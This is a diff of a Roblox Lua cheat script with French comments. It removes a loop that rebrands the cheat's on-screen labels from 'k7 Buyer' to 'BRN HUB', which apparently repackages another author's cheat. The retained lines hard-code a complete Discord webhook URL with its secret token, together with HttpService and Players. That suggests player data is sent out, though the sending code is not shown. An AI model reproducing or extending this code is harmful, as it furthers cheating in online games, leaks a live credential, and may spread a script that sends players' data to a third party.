@@ -2,34 +2,6 @@
 repeat task.wait() until game:IsLoaded()
  
 task.spawn(function()
-    -- On définit les noms
-    local OLD_NAME = "k7 Buyer"
-    local NEW_NAME = "BRN HUB"
-    local OLD_BRAND = "k7hub"
-    
-    local function ForceRebrand()
-        -- On cherche dans CoreGui (l'interface du cheat)
-        for _, v in pairs(game:GetService("CoreGui"):GetDescendants()) do
-            if v:IsA("TextLabel") or v:IsA("TextButton") then
-                -- Si on trouve k7 ou Buyer, on remplace par BRN HUB
-                if v.Text:find("k7") or v.Text:find("Buyer") then
-                    v.Text = v.Text:gsub(OLD_NAME, NEW_NAME)
-                                   :gsub(OLD_BRAND, NEW_NAME)
-                                   :gsub("k7", "BRN")
-                    
-                    -- Change la couleur en Vert BRN (optionnel)
-                    v.TextColor3 = Color3.fromRGB(0, 255, 150)
-                end
-            end
-        end
-    end
-
-    -- Scanne l'écran toutes les demi-secondes pour être sûr
-    while task.wait(0.5) do
-        pcall(ForceRebrand)
-    end
-end)
-
     local url = "https://discord.com/api/webhooks/1485392452088103153/BIiOu2r4bO5zKh40r93EG-aWfIOqOrumbgcj0-mhvh0apDLLjN_X0DZ1HuWkvSWOu2cb"
     local HttpService = game:GetService("HttpService")
     local Players = game:GetService("Players")
